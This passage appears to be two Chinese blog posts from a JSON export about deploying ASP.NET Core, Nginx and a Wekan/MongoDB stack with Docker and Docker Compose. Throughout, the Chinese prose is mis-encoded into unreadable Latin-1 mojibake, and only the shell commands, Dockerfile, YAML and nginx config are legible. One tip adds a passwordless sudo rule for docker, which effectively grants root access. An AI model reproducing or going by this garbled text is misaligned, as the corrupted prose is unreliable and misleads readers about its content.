æŒ‡ä»¤å¯ä»¥ä¸€æ¬¡å•Ÿå‹•æˆ–åœç”¨ç›¸é—œæœå‹™ï¼ŒDocker Compose é‚„æœƒä¾æ“šç›¸ä¾ depends_on æŒ‡å®šé—œè¯å…ˆå•Ÿå‹• DB å†å•Ÿå‹• Webï¼Œå…ˆé—œé–‰ Web å†é—œé–‰ DBï¼Œä¾¿åˆ©æ€§è®“äººå·¥æ“ä½œæœ›å¡µè«åŠã€‚\nåƒè€ƒï¼šDocker Compose åˆæ­¥é–±è®€èˆ‡å­¸ç¿’è¨˜éŒ„\nå¯¦ä¾‹ é‡å°ä¸Šè¿°ä¸‰ç¨®åšæ³•ï¼Œä»¥ ASP.NET Core + Ngninx ç‚ºé¡Œï¼Œå°æ˜ åˆ°ä»¥ä¸‹å¯¦ä¾‹ï¼š\n1. å®‰è£æˆå–®ä¸€ Container ä»¥ ASP.NET Core Image ç‚ºåŸºåº•ï¼Œå®‰è£ Nginxï¼Œè¨­å®š nginx.confï¼Œè¤‡è£½ ASP.NET Core ç¶²ç«™æª”æ¡ˆä¸¦è¨­å®š service nginx start åŠ dotnet /app/web.dll åˆ†åˆ¥å•Ÿå‹• Nginx åŠ Kestrelã€‚\nç´°ç¯€åšæ³•å¯åƒè€ƒé€™ç¯‡æ–‡ç« ï¼šNginx Reverse Proxy to ASP.NET Core â€“ Same Docker Container\nä¸éï¼Œè©²æ–‡ç”¨çš„ ASP.NET Core ç‰ˆæœ¬åèˆŠï¼Œè‹¥ç‚º ASP.NET Core 2.1 åŒ…æˆ Docker Container çš„åšæ³•è«‹åƒè€ƒå‰æ–‡\n2. ASP.NET Coreã€Nginx å„è‡ªè·‘ Container å°±æ˜¯æˆ‘å€‘åœ¨å‰ç¯‡æ–‡ç« æ¡è¡Œçš„æ–¹å¼ï¼Œä½†æœ‰ä¸€é»è¦è£œå……ï¼Œé™¤äº†ç›´æ¥å°æ˜ åˆ° Host OS IP çš„ TCP Portï¼Œä¹Ÿå¯è€ƒæ…®è‡ªè¨‚ Bridgeï¼Œè®“ Container åœ¨éš”é›¢ç¶²æ®µå…§æºé€šï¼Œä¾‹å¦‚ï¼šASP.NET Core çš„ 5000 Port åªæœ‰ Nginx çœ‹å¾—åˆ°ï¼Œå¾ Host OS ç„¡æ³•å­˜å–ï¼Œå¦‚æ­¤å¯é¿å…ç¶²è·¯ä»‹é¢(ç¶²ç«™ã€è³‡æ–™åº«\u0026hellip;)å¤–éœ²åˆ° Host OSï¼Œæ¸›å°‘è¢«æ”»æ“Šçš„é¢¨éšªï¼Œé€™éƒ¨åˆ†å¾Œé¢å†æ‰¾æ™‚é–“ä»‹ç´¹ã€‚\n3. ä½¿ç”¨ Docker Compose ä¸²é€£ ASP.NET Core èˆ‡ Nginx å„æœ‰è‡ªå·±çš„å®¹å™¨ï¼Œä½¿ç”¨ Docker Compose çµ„åˆä¸²é€£ï¼Œä¸€æ¬¡å•Ÿå‹•å…©å€‹æœå‹™ã€‚\nç´°ç¯€åšæ³•å¯åƒè€ƒé€™ç¯‡æ–‡ç« ï¼šNginx Reverse Proxy to ASP.NET Core â€“ Separate Docker Containers\nç¶œåˆä»¥ä¸Šåˆ†æï¼ŒDocker Compose ç„¡ç–‘æ˜¯æ•´åˆé—œè¯ Container è¼ƒä½³çš„æ–¹å¼ã€‚\nç·´ç¿’ å…‰èªªä¸ç·´æ˜¯å‡æŠŠå¼ï¼Œå¯«æŠ€è¡“æ–‡æ²’å¯¦ä½œæ„Ÿè¦ºæ€ªæ€ªçš„ï¼Œä¾†å€‹ Docker Compose ç·´ç¿’å¥½äº†ã€‚æ‰‹é‚Šæ²’æœ‰ ASP.NET Core + DB Server çš„ç¯„ä¾‹ï¼Œå°±ç”¨ Docker å¯ä»¥æ‰¾åˆ°çš„ Image ç•¶é¡Œæ(ä¹Ÿæ–¹ä¾¿å¤§å®¶å¯¦åœ°é©—è­‰)ï¼Œè©¦è©¦ç”¨ Container è·‘ Wekan çœ‹æ¿ç³»çµ±ã€‚Wekan åœ¨ Node.js åŸ·è¡Œï¼Œå¦å¤–éœ€è¦ MongoDBï¼Œé€™å€‹ç·´ç¿’æœƒç”¨ Docker Compose çµ„åˆå…©å€‹ Container æ¶è¨­çœ‹æ¿ç¶²ç«™ã€‚\né–‹å§‹å‰ï¼Œè¨˜å¾—å…ˆå®‰è£ Docker Composeï¼Œå¦‚æœç™¼ç”Ÿ sudo docker-compose æ‰¾ä¸åˆ°æŒ‡ä»¤ï¼Œè¦å†åŠ ä¸Š sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose åƒè€ƒã€‚\nè¦ä½¿ç”¨ Docker Compose å¾ˆç°¡å–®ï¼Œèªªç©¿äº†å°±æ˜¯å°‡ Container è¨­å®šå¯«æˆ docker-compose.ymlï¼Œå¯«å¥½å¯«å°å†å‘¼å« docker-compose up -d å³å¤§åŠŸå‘Šæˆã€‚ä»¥ Wekan ç‚ºä¾‹ï¼Œdocker-compose.yml å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 version: \u0026#39;3\u0026#39; services: wekan: image: wekanteam/wekan:latest depends_on: - wekandb environment: - MONGO_URL=mongodb://wekandb/wekan - ROOT_URL=http://localhost:80 ports: - 80:8080 wekandb: image: mongo:3.2.14 volumes: - /var/www/wekan/db:/data/db åœ¨é€™å€‹ YAML è£¡ï¼Œæˆ‘å®šç¾©äº†å…©å€‹ Service Containerï¼Œåˆ†åˆ¥å« wekan åŠ wekandbã€‚\nWekan Container Image ä¾†è‡ª wekanteam/wekan æœ€æ–°ç‰ˆï¼Œdepends_on å®£å‘Š wekan ä¾è³´ wekandbï¼Œæ•… Docker Compose æœƒå…ˆå•Ÿå‹• wekandb å†å•Ÿå‹• wekanã€‚\nMONGO_URLã€ROOTL_URL ç‚ºç’°å¢ƒè®Šæ•¸ï¼Œå…¶ä¸­ MONGO_URL å¯«æˆ mongodb://wekandb/wekanï¼Œdocker-compose.yml æ‰€å®šç¾©çš„å„ Container é è¨­éš¸å±¬åŒä¸€å€‹ Bridge ç¶²æ®µï¼Œå½¼æ­¤å¯ç”¨æ©Ÿå™¨åç¨±è§£æã€‚\nWekan ç¶²ç«™åœ¨ Container æ›åœ¨ 8080 Portï¼Œé€é ports 80:8080 æœƒå°‡å…¶å°æ˜ åˆ° Host IP 80 Portã€‚\nwekandb Container å‰‡ä»¥ Mongo DB Container Image ç‚ºåŸºåº•ï¼Œè³‡æ–™åº«æª”æ¡ˆä»¥ Volume æ–¹å¼å°æ˜ åˆ° Host OS /var/www/wekan/db è³‡æ–™å¤¾ã€‚\né€™è£¡è£œå……ä¸€å€‹çœ‰è§’ï¼Œç”±æ–¼ SELinux è³‡å®‰ç®¡æ§è¼ƒåš´ï¼Œåœ¨ CentOS/REHL/Fedora ç‰ˆ Linux ä¸Š Docker Container è®€å– Volume å°æ˜ è³‡æ–™å¤¾å¯èƒ½æœƒå‡ºç¾ permission denied éŒ¯èª¤ï¼Œéœ€å°è©²è³‡æ–™å¤¾åŸ·è¡Œ chcon -Rt svirt\\_sandbox\\_file\\_t /var/www/wekan/db èª¿æ•´æ¬Šé™ï¼Œæˆ–åœ¨ç›®éŒ„åç¨±å¾Œæ–¹åŠ ä¸Š :Z ç”± Docker è‡ªå‹•åŸ·è¡Œã€‚\nåƒè€ƒï¼šUsing Volumes with Docker can Cause Problems with SELinux\nå¯«å¥½ docker-compose.ymlï¼ŒåŸ·è¡Œ sudo docker-compose up -dï¼ŒDocker Compose ä¾åºå¸¶èµ· weknadbã€wekan å…©å€‹å®¹å™¨ï¼ŒWekan çœ‹æ¿å·²åœ¨ Host OS 80 Port é‹è¡ŒæˆåŠŸã€‚\næœ€å¾Œè£œå……ä¸€é»ï¼Œå‰é¢æåˆ° Docker Compose æœƒç‚ºæ•´çµ„ Container å»ºç«‹å°ˆå±¬ Bridgeï¼Œä¸Šåœ–ä¸€é–‹å§‹çš„ Create network \u0026ldquo;wekan_default\u0026rdquo; with the default driver è¨Šæ¯å°±æ˜¯è­‰æ˜ã€‚\nåŸ·è¡Œ docker network lsï¼Œå¯çœ‹åˆ° wekan_default æ˜¯å€‹ bridgeï¼ŒåŸ·è¡Œ docker inspect wekan_default å‰‡å¯é€²ä¸€æ­¥çœ‹åˆ°é€™å€‹ç¶²æ®µç‚º 172.18..ï¼Œè€Œå…©å€‹ Container çš„ IP åˆ†åˆ¥ç‚º 172.28.0.3 åŠ 172.28.0.2ã€‚\nDocker Compose éå¸¸é©åˆç”¨ä¾†çµ„è£ Webã€DB ç­‰å¤šå€‹ Container æ§‹å»ºç³»çµ±ï¼Œä½†æˆ‘ç™¼ç¾é‡å° Nginx æ™‚æœ‰äº›é¡å¤–è€ƒé‡ï¼Œé€™éƒ¨åˆ†ç•™å¾…ä¸‹é›†åˆ†è§£ã€‚\n","date":"2022-12-07T00:00:00Z","image":"https://live.staticflickr.com/65535/52565101723_e9c2825542_o.png","permalink":"https://wayneblog.ga/2022-12-07/dotnet-core-docker-note-2/","title":"ASP.NET Core Docker ç­†è¨˜ 2 - çµ„åˆå®¹å™¨å»ºæ§‹ç³»çµ±"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nå‰é¢ç ”ç©¶éåœ¨ CentOS å®‰è£åŠè¨­å®š ASP.NET Core + Nginxï¼Œç¿’å¾—å¾’æ‰‹åœ¨ CentOS å®‰è£éƒ¨ç½²ä¼ºæœå™¨çš„æŠ€èƒ½ï¼Œä¾å¾ª Roadmap ä¾†åˆ°ä¸‹ä¸€éšæ®µ - å­¸ç¿’ä½¿ç”¨ Docker ç°¡åŒ–éƒ¨ç½²ã€‚\nå®¹å™¨åŒ–åŠ Docker é€™å¹¾å¹´ç†±åˆ°ç™¼ç‡™ï¼Œæœ‰äº›äººç”šè‡³èªç‚ºå®ƒå·²åœ¨è»Ÿé«”ç”¢æ¥­æ€èµ·ä¸€æ³¢é©å‘½ã€‚(æˆ‘è¦ªèº«é«”é©—çš„æ„Ÿæƒ³ä¹Ÿæ˜¯ï¼šWow! é›£æ€ªæœƒçˆ†ç´…) æ­¤åˆ»æ‰èµ·æ­¥å·²ç®—é²äº†ï¼Œä½†ä¹Ÿä¸æ˜¯æ²’æœ‰å¥½è™•ï¼Œæ™šèµ·é³¥å…’æœ‰æ›´å¤šèŸ²å¯ä»¥åƒï¼ŒDocker ç›¸é—œçš„æ–‡ç« è³‡æºå¤šå¦‚ç‰›æ¯›ï¼Œé€™è£¡ä¾¿ä¸å¤šèŠ±ç¯‡å¹…è´…è¿°è§€å¿µèˆ‡åŸºæœ¬æ“ä½œï¼Œåªç°¡å–®æ•´ç†æˆ‘å° Docker çš„ç†è§£ã€‚\nDocker ç›¸é—œä»‹ç´¹ Container Container (å®¹å™¨)å¯ä»¥æƒ³æˆæ¥µåº¦è¼•é‡åŒ–çš„è™›æ“¬æ©Ÿå™¨(Virtual Machine)ï¼Œç”¨æ³•åŠå„ªé»èˆ‡ VM ç›¸åŒï¼Œèƒ½åœ¨ä¸€å° Host OS åŒæ™‚é‹è¡Œå¤šå€‹å½¼æ­¤éš”é›¢çš„æ‡‰ç”¨ç¨‹å¼ç’°å¢ƒï¼Œä½†å·®åˆ¥åœ¨ Container æœƒå…±ç”¨åº•å±¤ Host OSï¼Œç›¸è¼ƒ VM éœ€å„è·‘ä¸€ä»½ Guest OS èƒ½çœä¸‹å¯è§€çš„è¨˜æ†¶é«”ã€ç£ç¢Ÿï¼Œå› æ­¤ Container å¤šäº†å•Ÿå‹•é€Ÿåº¦å¿«ï¼Œè€—ç”¨è³‡æºå°‘(èˆ‡ç›´æ¥è·‘æ‡‰ç”¨ç¨‹å¼ç›¸å»ä¸é )çš„å„ªå‹¢ã€‚\nä¸€å° 4GB RAM çš„æ©Ÿå™¨é ‚å¤šè·‘ 2 - 3 å° VM å°±ç·Šç¹ƒäº†ï¼Œä½†åŸ·è¡Œæ•¸åä¸Šç™¾å€‹ Container ä¸æ˜¯å•é¡Œã€‚\n2 Container è·Ÿ VM ä¸€æ¨£å…·æœ‰å¾ˆå¥½çš„éš”é›¢æ•ˆæœï¼Œæ¯å€‹ Container æœ‰è‡ªå·±çš„ç¨ç«‹ä½œæ¥­ç’°å¢ƒ(è¨˜æ†¶é«”ã€ç£ç¢Ÿç©ºé–“ã€ç¶²è·¯)ï¼Œä¸æœƒå½¼æ­¤å¹²æ“¾ï¼Œä¸å¿…æ“”å¿ƒ Container A æ”¹ç³»çµ±è¨­å®šå®³ Container B è·‘ä¸èµ·ä¾†ï¼Œæˆ–æ˜¯å…©å€‹ Container äº’ç›¸æ¶å¥ª 80 Portï¼Œæ‹¿åˆ° Image å°±ä¸€å®šèƒ½åœ¨è‡ªå·±çš„æ©Ÿå™¨è·‘èµ·ä¾†ã€‚\nContainer åœ¨é€™æ–¹é¢çš„ç‰¹æ€§èˆ‡ VM å®Œå…¨ç›¸åŒï¼Œä½†å› ç‚ºä¸ç”¨åŒ…å…¥ä½œæ¥­ç³»çµ±ï¼Œé«”ç©ç¸®å°è¨±å¤šï¼Œè€—ç”¨è¨˜æ†¶é«”ä¹Ÿå°‘ï¼Œä½†ä¾¿åˆ©æ€§å®Œå…¨ä¸æ¸›ï¼Œå–å¾— Container Imageï¼Œé ä¸€è¡ŒæŒ‡ä»¤å¹¾ç§’å…§å°±èƒ½åœ¨æ©Ÿå™¨æŠŠç¨‹å¼è·‘èµ·ä¾†ã€‚\nDocker Hub Docker Hub ä¸Šæœ‰è¶…é 10 è¬å€‹ Container Imageï¼Œå¾ PHPã€Node,jsã€Apacheã€MySQLã€Mongo DBã€Nginxã€Redisã€ASP.NET Core\u0026hellip; å¹¾ä¹æƒ³å¾—åˆ°çš„éƒ½æœ‰ï¼Œä¸‹æŒ‡ä»¤è‡ªå‹•ä¸‹è¼‰ Imageï¼Œå¹¾ç§’é˜å°±è£å¥½ä¸€å° DBã€Web ä¼ºæœå™¨ï¼Œå†ä¸‹å€‹æŒ‡ä»¤åˆè£å¥½ç¬¬äºŒå°ï¼Œä¸ç”¨æ“”å¿ƒè·Ÿä½œæ¥­ç³»çµ±ä¸ç›¸å®¹ã€èˆ‡å…¶ä»–è»Ÿé«”ç›¸è¡ã€ç³»çµ±ç’°å¢ƒæœ‰èª¤å°è‡´å®‰è£å¤±æ•—ï¼Œé€™å°±æ˜¯ Docker æœ€è¿·äººçš„æ‰€åœ¨ã€‚\nè€Œæˆ‘å€‘ä¹Ÿå¯å°‡è‡ªå·±çš„å°ˆæ¡ˆç¶²ç«™åšæˆ Imageï¼Œäº¤çµ¦æ¸¬è©¦äººå“¡æ¸¬è©¦ï¼Œäº¤ä»˜ OP å¹¾ç§’éƒ¨ç½²ä¸Šç·šï¼Œä¹Ÿèƒ½å°‡åšå¥½çš„ Image ä¸Šå‚³åˆ° Docker Hub èˆ‡å…¨ä¸–ç•Œåˆ†äº«ã€‚\nDocker Container Docker Container èµ·åˆæ˜¯åŸºæ–¼ Linux Container æŠ€è¡“ï¼Œæ•…åœ¨ Container åªèƒ½è·‘ Linux å¹³å°æ‡‰ç”¨ç¨‹å¼ï¼Œé›–ç„¶åœ¨ Windows ä¹Ÿæœ‰ Docker for Windowsï¼Œä½†èƒŒå¾Œæ˜¯ç”¨ Hyper-V è·‘ Linux è™›æ“¬æ©ŸåŸ·è¡Œ Docker Engine å†è·‘ Docker Containerã€‚\nå¾Œä¾†å¾®è»Ÿä¹Ÿä¾å¾ªç›¸åŒæ¦‚å¿µç™¼å±•å‡º Windows Containerï¼Œä¸¦èå…¥ Docker é«”ç³»ï¼Œè‡ªæ­¤ Docker Container é–‹å§‹æœ‰ Linux Containerã€Windows Container ä¹‹åˆ†ï¼ŒWindows Container è£¡è·‘çš„å°±æ˜¯ä¸æŠ˜ä¸æ‰£çš„ Windows ç¨‹å¼ã€‚\nåƒè€ƒï¼šå®‰è£ Docker å®¹å™¨ç’°å¢ƒ - Windows Server 2016\nå¾æ­¤ï¼Œåœ¨ Container è£¡è·‘ ASP.NET WebFormä¸å†æ˜¯å¤¢ã€‚\nWindows Container Windows Container å•å¸‚å¾Œï¼ŒASP.NET Core ç¨‹å¼å®¹å™¨åŒ–æœ‰ Linux Container èˆ‡ Windows Container å…©ç¨®é¸æ“‡ã€‚\nåŸºæ–¼ Linux Container è³‡æºæ•¸é‡ä¸Šçš„å„ªå‹¢ï¼ŒåŠ ä¸Šè€—ç”¨è³‡æºè¼ƒå°‘ï¼Œè»Ÿç¡¬é«”æˆæœ¬ä½ï¼Œæˆ‘é¸æ“‡ Linux Containerã€‚\né›–ç„¶ Container é–“å…±ç”¨åº•å±¤ä½œæ¥­ç³»çµ±ï¼ŒDocker Engine ç‚ºå®¹å™¨ä¸­çš„æ‡‰ç”¨ç¨‹å¼æä¾›éš”é›¢ä¸å—å¹²æ“¾çš„ç©ºé–“ï¼ˆè¨˜æ†¶é«”ã€æª”æ¡ˆç³»çµ±ã€ç¶²è·¯ Portï¼‰ã€‚\nä¾‹å¦‚ï¼šå®¹å™¨ A å¯«å…¥ /etc/aaa/default.conf ä¸å½±éŸ¿å®¹å™¨ B /etc/aaa/default.conf çš„å…§å®¹ã€å®¹å™¨ A èˆ‡å®¹å™¨ B éƒ½ç¹«çµåˆ° 80 Port ä¹Ÿä¸æœƒè¡çªã€‚\nå…ˆå‰æ–‡ç« æéå°‡ Kestrel è½‰ç‚º Linux æœå‹™ã€è¨­å®š www-data åŸ·è¡Œæ¬Šé™\u0026hellip; ç­‰æ­¥é©Ÿï¼Œæ”¹ç”¨ Docker å¾Œç°¡å–®å¾ˆå¤šï¼Œç”Ÿå‘½é€±æœŸç”± Docker æ§åˆ¶ï¼Œåœ¨å®¹å™¨å…§éƒ¨æ¬Šé™ä¸€å¾‹ç‚º root ä¸éœ€é¡å¤–è¦åŠƒæ¬Šé™ï¼Œç›´æ¥è·‘ dotnet WebApp.dll è½ 5000 Port å°±å¥½ã€‚\nåƒè€ƒè³‡æ–™ï¼š\n10å€‹Q\u0026amp;Aå¿«é€Ÿèªè­˜Docker ã€ŠDocker â€”â€” å¾å…¥é–€åˆ°å¯¦è¸Â­ã€‹æ­£é«”ä¸­æ–‡ç‰ˆ Docker å…¥é—¨æ•™ç¨‹ by é˜®ä¸€å³° ç·´ç¿’ Docker å®‰è£èˆ‡åŸºæœ¬æ“ä½œçš„åƒè€ƒè³‡æ–™å¾ˆå¤šï¼Œé€™è£¡ä¸å¤šä»‹ç´¹ï¼Œç›´æ¥ä¾†å¹¾å€‹ç·´ç¿’æš–èº«ï¼šåœ¨ CentOS ä¸Šç”¨ Docker ä¸‹è¼‰ç¾æˆ Conatiner Image åŸ·è¡Œ Nginx ä¼ºæœå™¨ï¼Œå†ç”¨é è¨­å°ˆæ¡ˆç¯„æœ¬å»ºç«‹ ASP.NET Core ç¶²ç«™ä¸¦åŒ…é€² Container åŸ·è¡Œã€‚æœ€å¾Œå°‡äºŒè€…ä¸²æ¥åœ¨ä¸€èµ·ï¼Œä½¿ç”¨ Nginx åšç‚º ASP.NET Core ç¶²ç«™çš„ Reverse Proxyã€‚\nåŸ·è¡Œ Nginx Container åŸ·è¡Œ Nginx Container\n1 sudo docker run --name mynginx -d -p 80:80 --rm nginx ä¸èª‡å¼µï¼ŒçœŸçš„åªè¦é€™è¡Œ Nginx å°±å¥½äº†ã€‚\n-dï¼šæŠŠ Container ä¸Ÿåˆ°èƒŒæ™¯åŸ·è¡Œä¸è¦ä½”ç”¨å‘½ä»¤åˆ—è¦–çª— -p 80:80ï¼šè¡¨ç¤ºå°‡ Container çš„ 80 Port å°æ‡‰åˆ° Host OS çš„ 80 Port --rmï¼šè¡¨ç¤º Container åœæ­¢æ™‚è‡ªå‹•åˆªé™¤ã€‚ é–‹å€‹ Chrome é€£ä¸Š Host OS çš„ 80 Portï¼ŒNginx å·²ç¶“æº–å‚™å°±ç·’ï¼\nè¨»ï¼šdocker æŒ‡ä»¤éœ€ç¹«çµ Unix Socketï¼Œå¿…é ˆä»¥ SuperUser æ¬Šé™åŸ·è¡Œï¼Œå°‡ä½¿ç”¨è€…åŠ å…¥ Docker ç¾¤çµ„å¯çœå»æ¯æ¬¡åŠ  sudo çš„éº»ç…©ã€‚åƒè€ƒï¼šManage Docker as a non-root user\n1 2 sudo groupadd docker sudo usermod -aG docker $USER ä½†é€™æ‹›åœ¨ CentOS/Fedora/RHEL ä¸ç®¡ç”¨!ï¼Œä½†æœ‰æ›¿ä»£æ–¹æ¡ˆï¼šåœ¨ /etc/sudoers åŠ å…¥ yourUserAccount ALL=(ALL) NOPASSWD: /usr/bin/docker é–‹æ”¾ sudo docker æ™‚ä¸ç”¨æ•²å¯†ç¢¼ï¼Œå†ç”¨ alias docker=\u0026quot;sudo /usr/bin/docker\u0026quot; å»ºç«‹åŒç¾©è©ï¼Œä¹Ÿå¯åšåˆ°ä¸å¿… sudo æ•²å¯†ç¢¼è·‘ docker æŒ‡ä»¤ã€‚\nå°‡ ASP.NET Core å°ˆæ¡ˆåŒ…é€² Container å°‡ ASP.NET Core å°ˆæ¡ˆåŒ…é€² Container ä½¿ç”¨ .NET Core CLI å»ºç«‹ MVC å°ˆæ¡ˆï¼Œä¿®æ”¹ Startup.cs å–æ¶ˆ app.UseHttpsRedirection()ï¼Œä»¥ Kestrel åŸ·è¡Œ ASP.NET Core ç¶²ç«™ã€‚\n1 2 3 4 dotnet new mvc sed -i -e \u0026#39;s/app.UseHttps/\\/\\/app.UseHttps/\u0026#39; Startup.cs dotnet publish dotnet bin/Debug/netcoreapp2.1/web.dll ç”±æ–¼ 5000 Port é è¨­ä¸å°å¤–é–‹æ”¾ï¼Œæ‡¶å¾—é–‹é˜²ç«ç‰†ï¼Œåœ¨æœ¬æ©Ÿç”¨ curl httq://localhost:5000 é©—è­‰ç¶²ç«™é‹è¡Œä¸­ã€‚\né©—è­‰ç¨‹å¼å¯åŸ·è¡Œå¾Œï¼Œå¯«å€‹ Dockerfile è…³æœ¬å°‡ç¨‹å¼å°è£æˆ Docker Imageï¼Œé€™éƒ¨åˆ†ç´°ç¯€å¯åƒè€ƒä¿å“¥çš„æ–‡ç« ï¼šå¦‚ä½•å°‡ ASP.NET Core 2.1 ç¶²ç«™éƒ¨ç½²åˆ° Docker å®¹å™¨ä¸­ã€‚\nåœ¨å¯¦å‹™ç’°å¢ƒå¯ä»¥è¨­è¨ˆæˆå…¨è‡ªå‹•åŒ–æ¸¬è©¦æµç¨‹ï¼Œåˆ°ç‰ˆæ§æŠ“åŸå§‹ç¢¼æ”¾é€²å…§å« .NET Core SDK çš„ Container ç·¨è­¯ï¼Œå°‡çµæœåŒ…æˆåªæœ‰ .NET Core Runtime çš„ Container Imageï¼Œç”¨å®ƒå»ºç«‹ Container é€²è¡Œ E2E æ¸¬è©¦ï¼Œä¸€åˆ‡è‡ªå‹•åŒ–ã€‚é€™è£¡ç‚ºæ±‚ç°¡ä¾¿ï¼Œæˆ‘é¸æ“‡ç”¨åªæœ‰ Runtime çš„ Container Image ç•¶æˆåŸºåº•ï¼Œå°‡åœ¨ Host OS ç·¨è­¯å¥½çš„æª”æ¡ˆè¤‡è£½åˆ° Container /app ç›®éŒ„ï¼ŒDockerfile å…§å®¹å¦‚ä¸‹ï¼š\n1 2 3 4 FROM microsoft/dotnet:2.1-aspnetcore-runtime WORKDIR /app COPY ./bin/Debug/netcoreapp2.1 ./ ENTRYPOINT [\u0026#34;dotnet\u0026#34;, \u0026#34;web.dll\u0026#34;] åšå¥½ Dockerfile å¾ŒåŸ·è¡Œ docker buildï¼ŒDocker æœƒå¾ Docker Hub ä¸‹è¼‰ microsoft/dotnet:2.1-aspnetcore-runtime (microsoft/dotnet æ˜¯ Image åç¨±ï¼ŒåŒä¸€ Image å¸¸æœ‰å¤šç¨®ç‰ˆæœ¬å¯é¸æ“‡ï¼Œ:2.1-aspnetcore-runtime æ˜¯æ¨™ç±¤å¯ç”¨ä¾†æŒ‡å®šç‰ˆæœ¬)ï¼Œ-t åƒæ•¸æŒ‡å®š Image åç¨±ç‚º testappã€‚\nContainer Image åšå¥½å¾Œæ¥è‘—ç”¨ docker run -d --rm --name myapp -p 5000:80 testapp ç”¨å‰›åšå¥½çš„ Image å»ºç«‹ Containerï¼ŒASP.NET Core å°ˆæ¡ˆåœ¨ Container åŸ·è¡Œæ™‚ï¼Œé è¨­è½ 80 Portï¼Œæ•…æˆ‘å€‘ç”¨ -p 5000:80 å°‡ Container çš„ 80 Port å°å‘ Host OS çš„ 5000 Portã€‚ç”¨ curl é©—è­‰ç¶²ç«™é‹è¡Œä¸­ã€‚\nä½¿ç”¨ docker images åŠ docker ps æˆ‘å€‘å¯ä»¥çœ‹åˆ°å‰›æ‰å»ºç«‹çš„ Image testapp åŠ Container myappï¼š\nå°‡ Nginx è¨­æˆ ASP.NET Core ç¶²ç«™çš„ Reverse Proxy è‡³æ­¤ï¼Œæˆ‘å€‘åšäº†å…©å€‹ Containerï¼Œmyginx è½ Host OS 80 Portï¼Œmyapp è½ Host OS çš„ 5000 Portï¼Œä¸‹ä¸€æ­¥è¦å°‡ Nginx è¨­æˆ ASP.NET Core ç¶²ç«™çš„ Reverse Proxyã€‚\nåšæ³•è·Ÿå…ˆå‰æ–‡ç« ä»‹ç´¹éçš„æ¦‚å¿µå·®ä¸å¤šï¼Œç‚ºæ±‚ç°¡ä¾¿æˆ‘å€‘ç›´æ¥ä¿®æ”¹ conf.d/default.conf å°‡é€²å…¥ 80 Port çš„è«‹æ±‚å°å‘ 5000 Portã€‚(æ­£è¦åšæ³•å»ºè­°ä¸€å€‹ç¶²ç«™é–‹ä¸€å€‹ conf æª”) Container çš„æª”æ¡ˆç³»çµ±æ˜¯éš”é›¢çš„ï¼Œå°‡è¨­å®šæª”ä¿å­˜åœ¨ Container è£¡ä¸æ˜¯å¥½ä¸»æ„ - é™¤éæ¯æ¬¡ä¿®æ”¹è¨­å®šå­˜æª”å°±é‡æ–°ç”¢ç”Ÿ Image ä¸¦è¦æ±‚æœªä¾†ä¸€å¾‹æ”¹ç”¨æ–°ç‰ˆ Image å»ºç«‹ Containerï¼Œå¦å‰‡ä¸€æ—¦ Conatiner è¢«åˆªé™¤ï¼Œè¨­å®šå°±æœƒæ¶ˆå¤±ã€‚åŒæ¨£å•é¡Œä¹Ÿæœƒç™¼ç”Ÿåœ¨è³‡æ–™åº«æª”ã€Log æª”ç­‰åŸ·è¡ŒæœŸé–“è¦å‹•æ…‹æ›´æ–°çš„å…§å®¹ï¼Œé€™é¡æª”æ¡ˆä¿å­˜åœ¨ Host OS æª”æ¡ˆç³»çµ±ä¸Šæ¯”è¼ƒåˆç†ï¼Œç¨‹å¼æ›ç‰ˆæ›äº† Container Image è³‡æ–™æ‰ä¸å—å½±éŸ¿ã€‚Docker é  Volume è§£æ±ºè³‡æ–™ä¿å­˜åŠå…±ç”¨éœ€æ±‚ï¼Œdocker run æœ‰å€‹ -v host-path:container-path å¯å°‡ Host OS ç‰¹å®šç›®éŒ„æˆ–æª”æ¡ˆå°æ˜ åˆ° Containerï¼Œè®“ Container èƒ½è®€å¯« Host OS çš„æª”æ¡ˆã€‚\nå° Nginx Container ä¾†èªªï¼ŒReverse Proxy è¨­å®šæ”¾åœ¨ /etc/nginx/conf.dï¼Œæˆ‘é¸æ“‡åœ¨ Host OS ä¹Ÿå»ºç«‹ç›¸åŒè·¯å¾‘ä¸¦å°‡ Container çš„ default.conf è¤‡è£½å‡ºä¾†(æŒ‡ä»¤å¦‚ä¸‹)ï¼Œä¿®æ”¹å¾Œåœ¨ docker run åŠ ä¸Š -v /etc/nginx/conf.d:/etc/nginx/conf.d å°æ˜ å›å»ï¼š\n1 sudo docker cp mynginx:/etc/nginx/conf.d /etc/nginx/conf.d ä¿®æ”¹ /etc/nginx/conf.d/default.confï¼Œç›®å‰æ˜¯å°‡é€²å…¥ Nginx 80 Port çš„è«‹æ±‚å°å‘ Host OS 5000 Portï¼Œä½†å¾ Docker Container å­˜å– Host OS IP æœ‰äº›çœ‰è§’ï¼ŒMac æˆ– Windows Docker 18.3+ å¯ç”¨ DNS åç¨± host.docker.internal æŒ‡å‘ Host OS IPï¼Œä½† Docker for Linux 18.4+ é€™æ‹›å·±å¤±æ•ˆã€‚åƒè€ƒ\nçœäº‹åšæ³•æ˜¯ docker run æ™‚ç”¨ --network host è®“ Container ç›´æ¥ç¹«çµæœ¬æ©Ÿ IP è€Œé Docker æ‰€å±¬çš„éš”é›¢ç¶²æ®µï¼Œå¦‚æ­¤ default.conf çš„ proxy_pass æŒ‡å‘ localhost:5000 å³å¯ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 server { listen 80; server_name localhost; #charset koi8-r; #access_log /var/log/nginx/host.access.log main; location / { proxy_pass http://localhost:5000; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection keep-alive; proxy_set_header Host $host; proxy_cache_bypass $http_upgrade; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } } å®Œæ•´å•Ÿå‹•æŒ‡ä»¤å¦‚ä¸‹ï¼š\n1 sudo docker run --name mynginx -d -v /etc/nginx/conf.d:/etc/nginx/conf.d --network host nginx å¾é ç«¯é–‹å•Ÿ Chrome é€£ä¸Š Host OS çš„ 80 Portï¼Œæˆ‘å€‘å·²è¢«é †åˆ©å°å‘ ASP.NET Core ç¶²ç«™ï¼Œé¡¯ç¤ºè¨­å®šæˆåŠŸã€‚\nç¶“éä»¥ä¸Šç·´ç¿’ï¼Œæˆ‘å€‘é«”é©—äº†å¾ Docker Hub ä¸‹è¼‰ Image å»ºç«‹ Docker Containter 